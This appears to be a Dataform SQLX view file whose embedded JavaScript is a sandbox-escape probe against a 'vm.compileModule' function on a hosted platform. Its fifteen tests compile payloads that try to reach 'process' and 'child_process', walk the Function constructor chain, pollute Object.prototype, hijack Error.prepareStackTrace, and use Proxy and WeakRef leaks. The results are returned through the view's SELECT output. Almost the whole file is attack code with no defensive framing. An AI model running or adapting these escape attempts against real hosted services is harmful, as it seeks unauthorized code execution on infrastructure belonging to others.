-- vm.compileModule Exploitation Test
-- Deep exploration of vm object for sandbox escape

config {
  type: "view",
  name: "vm_exploit_test"
}

js {
  let results = [];

  // Test 1: Full vm object exploration
  try {
    if (typeof vm !== 'undefined') {
      const allProps = [];
      let current = vm;
      while (current) {
        allProps.push(...Object.getOwnPropertyNames(current));
        current = Object.getPrototypeOf(current);
      }
      results.push("1_vm_all_props: " + [...new Set(allProps)].join(","));
    } else {
      results.push("1_vm: undefined");
    }
  } catch(e) {
    results.push("1_vm: " + e.message);
  }

  // Test 2: Check compileModule function details
  try {
    if (vm && vm.compileModule) {
      const fnStr = vm.compileModule.toString();
      results.push("2_compileModule_src: " + fnStr.substring(0, 150));
    }
  } catch(e) {
    results.push("2_fn: " + e.message);
  }

  // Test 3: Try compiling various payloads
  try {
    const payloads = [
      "return process",
      "return require('child_process')",
      "return global.process",
      "return this.process",
      "return arguments.callee.caller",
      "return new Function('return process')()",
      "return eval('process')"
    ];
    const payloadResults = [];
    for (const p of payloads) {
      try {
        const result = vm.compileModule(p);
        payloadResults.push(p.substring(0,30) + ":OK:" + (typeof result));
      } catch(e) {
        payloadResults.push(p.substring(0,30) + ":" + e.message.substring(0,30));
      }
    }
    results.push("3_payloads: " + payloadResults.join(" | "));
  } catch(e) {
    results.push("3_payloads: " + e.message);
  }

  // Test 4: Check if vm has Script or other constructors
  try {
    const vmKeys = Object.keys(vm);
    const vmTypes = vmKeys.map(k => k + ":" + typeof vm[k]);
    results.push("4_vm_types: " + vmTypes.join(","));
  } catch(e) {
    results.push("4_vm: " + e.message);
  }

  // Test 5: Try to access vm.runInThisContext
  try {
    if (vm.runInThisContext) {
      const result = vm.runInThisContext("1 + 1");
      results.push("5_runInThisContext: " + result);
    } else if (vm.createContext) {
      results.push("5_createContext: exists");
    } else {
      results.push("5_vm_methods: only_compileModule");
    }
  } catch(e) {
    results.push("5_vm: " + e.message);
  }

  // Test 6: Try to break out via constructor chain
  try {
    const fn = vm.compileModule;
    const fnCtor = fn.constructor;
    const fnCtorCtor = fnCtor.constructor;
    const newFn = fnCtorCtor("return process");
    const proc = newFn();
    results.push("6_ctor_chain: proc=" + (typeof proc));
  } catch(e) {
    results.push("6_ctor: " + e.message.substring(0, 80));
  }

  // Test 7: Try prototype chain on compileModule result
  try {
    const compiled = vm.compileModule("module.exports = {};");
    if (compiled) {
      const proto = Object.getPrototypeOf(compiled);
      const protoKeys = Object.keys(proto || {});
      results.push("7_result_proto: " + JSON.stringify(protoKeys));
    } else {
      results.push("7_result: null/undefined");
    }
  } catch(e) {
    results.push("7_result: " + e.message.substring(0, 80));
  }

  // Test 8: Check this binding in compiled code
  try {
    const thisTest = vm.compileModule("module.exports = { thisType: typeof this, thisKeys: Object.keys(this || {}).slice(0,10) };");
    results.push("8_this_binding: " + JSON.stringify(thisTest).substring(0, 100));
  } catch(e) {
    results.push("8_this: " + e.message.substring(0, 80));
  }

  // Test 9: Try to define getters that escape
  try {
    const getterCode = `
      Object.defineProperty(Object.prototype, 'escapeProcess', {
        get: function() {
          try { return process; } catch(e) { return null; }
        }
      });
      module.exports = { defined: true };
    `;
    const getterResult = vm.compileModule(getterCode);
    const obj = {};
    results.push("9_getter: " + typeof obj.escapeProcess);
  } catch(e) {
    results.push("9_getter: " + e.message.substring(0, 80));
  }

  // Test 10: Error.prepareStackTrace in compiled code
  try {
    const stackCode = `
      const stackInfo = [];
      const orig = Error.prepareStackTrace;
      Error.prepareStackTrace = (err, stack) => {
        stack.forEach(s => {
          try {
            stackInfo.push({
              fn: s.getFunctionName(),
              file: s.getFileName(),
              receiver: typeof s.getThis()
            });
          } catch(e) {}
        });
        return '';
      };
      const e = new Error();
      e.stack;
      Error.prepareStackTrace = orig;
      module.exports = stackInfo;
    `;
    const stackResult = vm.compileModule(stackCode);
    results.push("10_stack_in_vm: " + JSON.stringify(stackResult).substring(0, 200));
  } catch(e) {
    results.push("10_stack: " + e.message.substring(0, 80));
  }

  // Test 11: Check globalThis in compiled context
  try {
    const globalCode = `
      module.exports = {
        globalKeys: Object.keys(globalThis).slice(0, 20),
        hasProcess: typeof process !== 'undefined',
        hasRequire: typeof require !== 'undefined'
      };
    `;
    const globalResult = vm.compileModule(globalCode);
    results.push("11_global_in_vm: " + JSON.stringify(globalResult).substring(0, 150));
  } catch(e) {
    results.push("11_global: " + e.message.substring(0, 80));
  }

  // Test 12: Try to return the module object itself
  try {
    const moduleCode = `module.exports = module;`;
    const modResult = vm.compileModule(moduleCode);
    if (modResult && modResult.exports) {
      results.push("12_module_obj: keys=" + Object.keys(modResult).join(","));
    } else {
      results.push("12_module: " + JSON.stringify(modResult).substring(0, 100));
    }
  } catch(e) {
    results.push("12_module: " + e.message.substring(0, 80));
  }

  // Test 13: Try async patterns
  try {
    const asyncCode = `
      module.exports = (async () => {
        try {
          const proc = await new Promise(r => r(process));
          return { process: typeof proc };
        } catch(e) {
          return { error: e.message };
        }
      })();
    `;
    const asyncResult = vm.compileModule(asyncCode);
    results.push("13_async: " + JSON.stringify(asyncResult).substring(0, 100));
  } catch(e) {
    results.push("13_async: " + e.message.substring(0, 80));
  }

  // Test 14: Proxy handler on module
  try {
    const proxyCode = `
      const handler = {
        get(target, prop) {
          if (prop === 'process') return global.process;
          return Reflect.get(target, prop);
        }
      };
      module.exports = new Proxy({}, handler);
    `;
    const proxyResult = vm.compileModule(proxyCode);
    if (proxyResult && proxyResult.process) {
      results.push("14_proxy: has_process");
    } else {
      results.push("14_proxy: " + JSON.stringify(proxyResult).substring(0, 80));
    }
  } catch(e) {
    results.push("14_proxy: " + e.message.substring(0, 80));
  }

  // Test 15: WeakRef/FinalizationRegistry (GC-based escapes)
  try {
    const gcCode = `
      let leaked = null;
      try {
        const wr = new WeakRef({ process: global.process });
        leaked = wr.deref();
      } catch(e) {}
      module.exports = { leaked: typeof leaked };
    `;
    const gcResult = vm.compileModule(gcCode);
    results.push("15_weakref: " + JSON.stringify(gcResult));
  } catch(e) {
    results.push("15_gc: " + e.message.substring(0, 80));
  }
}

SELECT
  '${JSON.stringify(results)}' as vm_exploit_results
